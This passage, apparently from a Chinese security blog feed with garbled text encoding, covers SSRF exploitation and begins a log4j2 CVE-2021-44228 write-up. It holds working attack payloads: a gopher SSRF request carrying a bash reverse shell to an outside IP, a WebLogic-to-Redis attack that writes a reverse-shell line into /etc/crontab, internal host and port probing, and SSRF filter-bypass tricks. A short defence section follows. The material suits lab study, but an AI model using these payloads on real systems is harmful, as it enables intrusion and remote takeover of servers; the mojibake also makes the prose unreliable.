&#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39;</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-af8614a8-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-af8614a8-6d72-1.jpg" alt="img"></a><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095632-afabc5e0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095632-afabc5e0-6d72-1.jpg" alt="img"></a><br> åå¼¹æˆåŠŸ<br> <code>192.168.1.5</code>æ˜¯å†…ç½‘WebæœåŠ¡ï¼Œæœ‰post.php</p><p><strong>4 .åˆ©ç”¨<code>http/s</code>åè®®</strong><br> æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p><p><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-aff15a38-6d72-1.jpg" alt="img"></p><p>è¯´æ˜å†…ç½‘ipä¸º<code>192.168.1.3</code>çš„ä¸»æœºå­˜æ´»</p><h1 id="SSRFåº”ç”¨æ”»å‡»å®æˆ˜"><a href="#SSRFåº”ç”¨æ”»å‡»å®æˆ˜" class="headerlink" title="SSRFåº”ç”¨æ”»å‡»å®æˆ˜"></a>SSRFåº”ç”¨æ”»å‡»å®æˆ˜</h1><h2 id="1ã€gopheræ”»å‡»redis"><a href="#1ã€gopheræ”»å‡»redis" class="headerlink" title="1ã€gopheræ”»å‡»redis"></a><strong>1ã€gopheræ”»å‡»redis</strong></h2><p>å‚è€ƒ<strong>è¿œç¨‹åˆ©ç”¨ 3.åˆ©ç”¨<code>gopher</code>åè®®</strong></p><h2 id="2ã€weblogic-ssrfæ”»å‡»redis"><a href="#2ã€weblogic-ssrfæ”»å‡»redis" class="headerlink" title="2ã€weblogic ssrfæ”»å‡»redis"></a><strong>2ã€weblogic ssrfæ”»å‡»redis</strong></h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br> ç¼–è¯‘å¹¶å¯åŠ¨ç¯å¢ƒ</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>SSRFæ¼æ´å­˜åœ¨äº<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p> <strong>1.æŸ¥çœ‹ç«¯å£</strong><br> è®¿é—®</p><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80//æµ‹è¯•http://127.0.0.1:7001ï¼šå°†80æ›¿æ¢æˆ7001</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095633-b02c20b4-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095633-b02c20b4-6d72-1.jpg" alt="img"></a><br> not connectï¼Œè¯´æ˜80ç«¯å£æœªå¼€æ”¾<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b05a47d2-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b05a47d2-6d72-1.jpg" alt="img"></a><br> è¿”å›404ï¼Œè¯´æ˜ç«¯å£å¼€æ”¾<br> <strong>2.æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</strong><br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b09834c0-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b09834c0-6d72-1.jpg" alt="img"></a><br> è¯´æ˜å†…ç½‘ipä¸º<code>192.168.1.1</code>çš„ä¸»æœºå­˜æ´»<br> <strong>3.æ³¨å…¥HTTPå¤´ï¼Œåˆ©ç”¨Redisåå¼¹shell</strong><br> é€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ï¼Œå‘ç°172.22.0.2:6379å¯ä»¥è¿é€š<br> å’Œä¸Šè¾¹çš„è¿œç¨‹åˆ©ç”¨å‡ ä¹ä¸€æ ·ã€‚<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095634-b0c0075c-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095634-b0c0075c-6d72-1.jpg" alt="img"></a><br> å°†åå¼¹shellè„šæœ¬å†™å…¥/etc/crontabå®šæ—¶ä»»åŠ¡</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>è¿›è¡Œurlç¼–ç </p><pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</code></pre><p>æ¢è¡Œç¬¦æ˜¯â€œ\r\nâ€æ¢æˆâ€œ%0D%0Aâ€ã€‚å°†urlç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨ssrfçš„åŸŸååé¢ï¼Œå‘é€<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b0fc12ec-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b0fc12ec-6d72-1.jpg" alt="img"></a><br> åå¼¹æˆåŠŸ<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20200324095635-b1233318-6d72-1.jpg"><img src="/2022/04/24/SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20200324095635-b1233318-6d72-1.jpg" alt="img"></a></p><h1 id="SSRFæ¼æ´ç›¸å…³ç»•è¿‡"><a href="#SSRFæ¼æ´ç›¸å…³ç»•è¿‡" class="headerlink" title="SSRFæ¼æ´ç›¸å…³ç»•è¿‡"></a>SSRFæ¼æ´ç›¸å…³ç»•è¿‡</h1><h2 id="1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•"><a href="#1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•" class="headerlink" title="1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•"></a><strong>1ã€å¸¸ç”¨ç»•è¿‡æ–¹æ³•</strong></h2><p><strong>1.@</strong></p><pre><code>http://abc@127.0.0.1å®é™…ä¸Šæ˜¯ä»¥ç”¨æˆ·åabcè¿æ¥åˆ°ç«™ç‚¹127.0.0.1ï¼ŒåŒç†http://8.8.8.8@127.0.0.1:8080ã€http://127.0.0.1#8.8.8.8</code></pre><p>åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œå¦‚ï¼š<br> <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br> åœ¨PHPçš„<code>parse_url</code>ä¸­ä¼šè¯†åˆ«<a href="http://www.ccc.com,è€Œ`libcur`låˆ™è¯†åˆ«ä¸ºwww.bbb.com/">www.ccc.comï¼Œè€Œ`libcur`låˆ™è¯†åˆ«ä¸ºwww.bbb.com</a><br> <strong>2.åˆ©ç”¨[::]</strong><br> å¯ä»¥åˆ©ç”¨<code>[::]</code>æ¥ç»•è¿‡localhost</p><pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p><strong>3.æ·»åŠ ç«¯å£å·</strong></p><pre><code>http://127.0.0.1:8080</code></pre><p><strong>4.åˆ©ç”¨çŸ­ç½‘å€</strong><br> <a href="http://tool.chinaz.com/tools/dwz.aspx">ç«™é•¿å·¥å…·çŸ­ç½‘å€</a><br> <a href="http://dwz.cn/">ç™¾åº¦çŸ­ç½‘å€</a><br> <strong>5.åˆ©ç”¨ç‰¹æ®ŠåŸŸå</strong><br> åŸç†æ˜¯DNSè§£æã€‚xip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³</p><pre><code>127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1</code></pre><p><strong>6.åˆ©ç”¨DNSè§£æ</strong><br> åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1<br> <strong>7.åˆ©ç”¨è¿›åˆ¶è½¬æ¢</strong></p><blockquote><p>127.0.0.1<br> å…«è¿›åˆ¶ï¼š0177.0.0.1<br> åå…­è¿›åˆ¶ï¼š0x7f.0.0.1<br> åè¿›åˆ¶ï¼š2130706433</p></blockquote><p><strong>8.å¥å·</strong></p><pre><code>127ã€‚0ã€‚0ã€‚1  &gt;&gt;&gt;  127.0.0.1</code></pre><p><strong>9.302è·³è½¬</strong><br> ä½¿ç”¨<a href="https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€/">https://tinyurl.comç”Ÿæˆ302è·³è½¬åœ°å€</a></p><h2 id="2ã€å¸¸è§é™åˆ¶"><a href="#2ã€å¸¸è§é™åˆ¶" class="headerlink" title="2ã€å¸¸è§é™åˆ¶"></a>2ã€å¸¸è§é™åˆ¶</h2><p><strong>1.é™åˆ¶ä¸º<a href="http://www.xxx.com/">http://www.xxx.com</a> åŸŸå</strong><br> é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@<br> <code>http://www.xxx.com@www.xxc.com</code><br> <strong>2.é™åˆ¶è¯·æ±‚IPä¸ä¸ºå†…ç½‘åœ°å€</strong><br> å½“ä¸å…è®¸ipä¸ºå†…ç½‘åœ°å€æ—¶<br> ï¼ˆ1ï¼‰é‡‡å–çŸ­ç½‘å€ç»•è¿‡<br> ï¼ˆ2ï¼‰é‡‡å–ç‰¹æ®ŠåŸŸå<br> ï¼ˆ3ï¼‰é‡‡å–è¿›åˆ¶è½¬æ¢<br> <strong>3.é™åˆ¶è¯·æ±‚åªä¸ºhttpåè®®</strong><br> ï¼ˆ1ï¼‰é‡‡å–302è·³è½¬<br> ï¼ˆ2ï¼‰é‡‡å–çŸ­åœ°å€</p><h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><h2 id="fileåè®®è¯»ä¸å‡ºæ–‡ä»¶"><a href="#fileåè®®è¯»ä¸å‡ºæ–‡ä»¶" class="headerlink" title="fileåè®®è¯»ä¸å‡ºæ–‡ä»¶"></a>fileåè®®è¯»ä¸å‡ºæ–‡ä»¶</h2><p><strong>1ã€æƒé™ä¸å¤Ÿï¼š</strong>å½“å‰ç”¨æˆ·å¯¹æ­¤æ–‡ä»¶æ²¡æœ‰å¯è¯»æƒé™</p><p><strong>2ã€è·¯å¾„è¾“é”™äº†ï¼š</strong>linuxç³»ç»Ÿä¸­ï¼Œfileä¹‹ååŠ è·¯å¾„æ˜¯ä¸‰ä¸ªæ–œçº¿ï¼Œä¸èƒ½å°‘ï¼šæ¯”å¦‚file:///etc/passwdï¼ˆå…¶å®å°±æ˜¯file://å’Œ/etc/passwdçš„ç»„åˆï¼‰</p><p><strong>3ã€å­˜åœ¨open_basedirï¼š</strong>å½“open_basediré…ç½®æœ‰å€¼æ—¶ï¼Œcurl_execä¸èƒ½ä½¿ç”¨fileåè®®ï¼Œå¹¶ä¸æ˜¯å—open_basedirçš„å€¼é™åˆ¶æŸäº›æ–‡ä»¶è¯»ä¸äº†ï¼Œè€Œæ˜¯æ•´ä¸ªfileåè®®éƒ½ä¸èƒ½ç”¨ã€‚è¿™æ˜¯å†™åœ¨phpçš„curl_execæºç é‡Œçš„ï¼Œç›®å‰æ²¡æ‰¾åˆ°ç»•è¿‡çš„æ–¹å¼ã€‚</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/ggmKrbiSh4fnScisOQkEciAqDHuDaiP4O9yu4IKOIoGIQOcJsNSvHK2ZHqk2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>4ã€phpæºç ä¸æ˜¾ç¤ºï¼š</strong>è¯»å–phpæºç ï¼Œå³ä½¿è¯»æˆåŠŸäº†ä¹Ÿä¸ä¼šåœ¨æµè§ˆå™¨é‡Œå›æ˜¾ï¼ˆç±»ä¼¼htmlçš„æ³¨é‡Šä¸€æ ·ï¼‰ï¼Œè¦åœ¨è¿”å›åŒ…é‡Œæˆ–è€…view-sourceä¸­å»çœ‹ã€‚</p><p><img src="SSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/imgpxy.phpurl=gnp=tmf_xw?046/AVOy6sdVuBHuoZ3dYmxMwTBApWe0dmkwyeSQcppVaiav5oIkWuzgY0Ek2EDyWEE0URtdEaiMUsdzaihmE7VJTI3bU/gnp_zibmm/nc.cipq.zibmm//:sptth" alt="img"></p><p><strong>5ã€ä¸å›æ˜¾çš„ssrfï¼š</strong>ä»£ç æ²¡å†™echoï¼Œè¿”å›å€¼èµ‹åˆ°å˜é‡é‡Œï¼Œè¯»æˆåŠŸäº†ä½ ä¹Ÿçœ‹ä¸åˆ°ã€‚</p><h2 id="gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…"><a href="#gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…" class="headerlink" title="gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…"></a>gopheråè®®å’Œdictåè®®å‘ä¸å‡ºåŒ…</h2><p>è‡ªå·±åœ¨è™šæ‹Ÿæœºæ­çš„æµ‹è¯•ç¯å¢ƒæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç°è±¡ï¼Œhttp/så’Œfileåè®®éƒ½èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä½†æ˜¯<strong>ä¸èƒ½æŒ‡å®šç«¯å£</strong>åŠ<strong>ä½¿ç”¨gopherå’Œdictåè®®</strong>ï¼Œå¦åˆ™å°±åªèƒ½å‘å‡ºdnsè¯·æ±‚ï¼Œå´ä¸èƒ½å»ºç«‹tcpçš„è¿æ¥ï¼ˆdnslogå¯ä»¥æ”¶åˆ°è¯·æ±‚ï¼Œncæ”¶ä¸åˆ°ï¼‰ã€‚</p><p>åé¢æŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°æ˜ç¡®çš„ç­”æ¡ˆï¼Œåªæœ‰ä¸€ä¸ªç–‘ä¼¼å¯èƒ½çš„åŸå› ï¼šphpåœ¨ç¼–è¯‘æ—¶æ²¡æœ‰ä½¿ç”¨**-with-curlwrappers**å‚æ•°ä¼šå¯¼è‡´è¿™ä¸ªé—®é¢˜ã€‚ä¸è¿‡è¿™ä¸ªå‚æ•°è²Œä¼¼åœ¨é«˜ç‰ˆæœ¬è¢«å»æ‰äº†ï¼Œæ‰€ä»¥åº”è¯¥åªå½±å“ä½ç‰ˆæœ¬phpå§ã€‚</p><p>åœ¨å®æˆ˜ä¸­å¦‚æœé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæ€»ä¸èƒ½ç™»ç›®æ ‡æœºå™¨æŠŠphpé‡æ–°ç¼–è¯‘ä¸€ä¸‹å§â€¦â€¦ï¼ˆåŠ¨ä½œå¤ªå¤§äº†ï¼Œè€Œä¸”éƒ½èƒ½ç™»æœºå™¨äº†è¿˜è¦ssrfæœ‰ä»€ä¹ˆç”¨å‘¢ï¼‰ï¼Œç›®å‰æ²¡æ‰¾åˆ°ä»€ä¹ˆåŠæ³•ç»•è¿‡ã€‚</p><h2 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h2><p>æµ‹è¯•ä¸€ä¸‹å„åè®®å¯¹ç‰¹æ®Šç¬¦å·çš„æ”¯æŒï¼Œä¸­æ–‡ç¬¦å·ä¸æµ‹è¯•ï¼Œæµ‹è¯•çš„æ‰€æœ‰ç¬¦å·å¦‚ä¸‹ï¼š</p><p>`~!@#$%^&amp;*()_-+=/|&#39;â€œ;:&lt;&gt;,.?{}[]</p><p><strong>ã€gopheråè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡äºŒæ¬¡urlç¼–ç éƒ½å¯ä»¥</p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œä½†åé¢æ¥16è¿›åˆ¶å­—ç¬¦å°±ä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åè¿˜æ˜¯ä¸èƒ½æ¥16è¿›åˆ¶ï¼ŒäºŒæ¬¡urlç¼–ç å¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡ï¼ŒäºŒæ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¹Ÿå¯ä»¥</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡äºŒæ¬¡urlç¼–ç åéƒ½å¯ä»¥</p><p><strong>ã€dictåè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¸è¡Œï¼ˆä¸æ”¯æŒäºŒæ¬¡è§£ç ï¼‰</p><p>ä»¥ä¸‹å‡ä¸æ”¯æŒäºŒæ¬¡urlè§£ç </p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œåé¢æ¥16è¿›åˆ¶ä¸è¡Œä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>?</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>:</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>ã€http/såè®®ã€‘</strong></p><p><strong>æ­£å¸¸ç¬¦å·ï¼š</strong>ç›´æ¥ä¼ ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥ï¼ŒäºŒæ¬¡urlç¼–ç ä¸è¡Œï¼ˆä¸æ”¯æŒäºŒæ¬¡è§£ç ï¼‰</p><p>ä»¥ä¸‹å‡ä¸æ”¯æŒäºŒæ¬¡urlè§£ç </p><p><strong>%</strong> ç›´æ¥ä¼ å¯ä»¥ï¼Œåé¢æ¥16è¿›åˆ¶ä¸è¡Œä¼šè½¬ä¹‰ï¼Œä¸€æ¬¡urlç¼–ç åå¯ä»¥</p><p><strong>#</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç ç»•ä¸è¿‡</p><p><strong>&amp;</strong> ä¼šæˆªæ–­ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>+</strong> ä¼šå˜æˆç©ºæ ¼ï¼Œä¸€æ¬¡urlç¼–ç å¯ä»¥</p><p><strong>ã€æ€»ç»“ã€‘</strong></p><p>**%#&amp;+**ç¬¦å·å®¹æ˜“å‡ºé—®é¢˜</p><p><strong>dictåè®®</strong>é¢å¤–ä¸æ”¯æŒ**?:**ä¸¤ä¸ªç¬¦å·ï¼Œurlç¼–ç æ— æ³•ç»•è¿‡</p><p><strong>ä¸€æ¬¡urlç¼–ç </strong>å¯ä»¥ç»•è¿‡**%&amp;+<strong>ä¸‰ç§ç¬¦å·ï¼Œä¸èƒ½ç»•è¿‡</strong>#**</p><p>**gopheråè®®çš„%**éœ€è¦ç¼–ç ä¸¤æ¬¡ç»•è¿‡ï¼Œåªä¸€æ¬¡ä¸è¡Œ</p><p><strong>gopher</strong>ä¸‡èƒ½åè®®ï¼Œ<strong>æ”¯æŒäºŒæ¬¡urlè§£ç </strong>ï¼Œæ²¡æœ‰ç»•ä¸è¿‡çš„ç‰¹æ®Šç¬¦å·ã€‚</p><h1 id="SSRFæ¼æ´é˜²å¾¡"><a href="#SSRFæ¼æ´é˜²å¾¡" class="headerlink" title="SSRFæ¼æ´é˜²å¾¡"></a>SSRFæ¼æ´é˜²å¾¡</h1><p>1ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®(å¦‚ï¼š<code>file:///</code>ã€<code>gopher://</code>,<code>dict://</code>ç­‰)ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚<br> 2ã€ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé˜²æ­¢æ ¹æ®é”™è¯¯ä¿¡æ¯åˆ¤æ–­ç«¯å£çŠ¶æ€<br> 3ã€ç¦æ­¢302è·³è½¬ï¼Œæˆ–æ¯æ¬¡è·³è½¬ï¼Œéƒ½æ£€æŸ¥æ–°çš„Hostæ˜¯å¦æ˜¯å†…ç½‘IPï¼Œç›´åˆ°æŠµè¾¾æœ€åçš„ç½‘å€<br> 4ã€è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IP</p><p>å‚è€ƒ:</p><p><a href="http://www.hackdig.com/07/hack-419420.htm">http://www.hackdig.com/07/hack-419420.htm</a></p><p><a href="https://xz.aliyun.com/t/7405#toc-2">https://xz.aliyun.com/t/7405#toc-2</a></p><p>åé¢æˆ‘æ‘†çƒ‚äº†ï¼ŒæœåŠ¡å™¨è€æ˜¯åï¼Œç­‰æœ‰æ—¶é—´ç»§ç»­å¤ç°æŠŠï¼Œå…ˆæŠ„ä¸‹å¤§ä½¬çš„æ–‡ç« ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2çš„ç®€å•å¤ç°</title>
      <link href="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åªæ˜¯ç®€ç•¥çœ‹äº†çœ‹è¿™ä¸ªæ¼æ´ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åŠæ—¶å¤ç°ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªæ¼æ´hwé—®çš„å¾ˆå¤šï¼Œæ‰€ä»¥è¿˜æ˜¯åŠæ—¶å¤ç°ä¸€ä¸‹å§ã€‚</p><h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„ä¸€ä¸ª<a href="https://github.com/apache/logging-log4j2">å¼€æº</a>çš„åŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚Log4j2 æ˜¯ä¸€ä¸ª Log4j 1.x çš„é‡å†™ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ç”±äºå…¶ä¼˜å¼‚çš„æ€§èƒ½è€Œè¢«å¹¿æ³›çš„åº”ç”¨äºå„ç§å¸¸è§çš„ Web æœåŠ¡ä¸­ã€‚</p><p>2021 å¹´ 12 æœˆ 9 æ—¥æ™šï¼ŒLog4j2 çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ç»†èŠ‚è¢«å…¬å¼€ã€‚æ”»å‡»è€…ä½¿ç”¨ <code>$&#123;&#125;</code> å…³é”®æ ‡è¯†ç¬¦è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>æ¼æ´ç¼–å·ï¼š<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p><p>- æ¼æ´ï¼šLog4j2 çš„ JNDI åŠŸèƒ½ç‚¹æ— æ³•é˜²å¾¡æ¥è‡ªæ”»å‡»è€…çš„ ldap ä»¥åŠå…¶ä»–ç›¸å…³ç«¯ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚<br>- ä¸¥é‡ç­‰çº§ï¼šCritical<br>- Basic CVSS è¯„åˆ†ï¼š10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- å½±å“ç‰ˆæœ¬ï¼šall versions from 2.0-beta9 to 2.14.1</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>ç”±äºæœ¬äººä»£ç åŠŸåº•æœ‰é™ï¼Œå°±å¤§æ¦‚è¯´æ˜ä¸‹ï¼Œä¸è¿›è¡Œä»£ç è·Ÿè¿›äº†ã€‚</p><p>log4j2æä¾›äº†ä¸€ç§å«<code>lookups</code>çš„åŠŸèƒ½æ¥å†™æ—¥å¿—</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p><p>è€Œæ¼æ´æˆå› å°±æ˜¯log4j2æ”¯æŒ<code>Jndi Lookup</code></p><p>æ—¥å¿—ä¸­åŒ…å« <code>$&#123;&#125;</code>,lookupåŠŸèƒ½å°±ä¼šå°†è¡¨è¾¾å¼çš„å†…å®¹æ›¿æ¢ä¸ºè¡¨è¾¾å¼è§£æåçš„å†…å®¹ï¼Œè€Œä¸æ˜¯è¡¨è¾¾å¼æœ¬èº«ã€‚log4j 2å°†åŸºæœ¬çš„è§£æéƒ½åšäº†å®ç°ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p><p>å¸¸è§è§£æï¼š</p><pre><code>$&#123;ctx:loginId&#125;$&#123;map:type&#125;$&#123;filename&#125;$&#123;date:MM-dd-yyyy&#125;$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;$&#123;docker:imageName&#125;$&#123;env:USER&#125;$&#123;event:Marker&#125;$&#123;mdc:UserId&#125;$&#123;java&#125;$&#123;jndi:logging/context-name&#125;$&#123;hostName&#125;$&#123;docker:containerId&#125;$&#123;k8s&#125;$&#123;log4j&#125;$&#123;main&#125;$&#123;name&#125;$&#123;marker&#125;$&#123;spring&#125;$&#123;sys:logPath&#125;$&#123;web:rootDir&#125;</code></pre><p>JNDIå°±æ˜¯æä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œå¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚è€Œlog4j 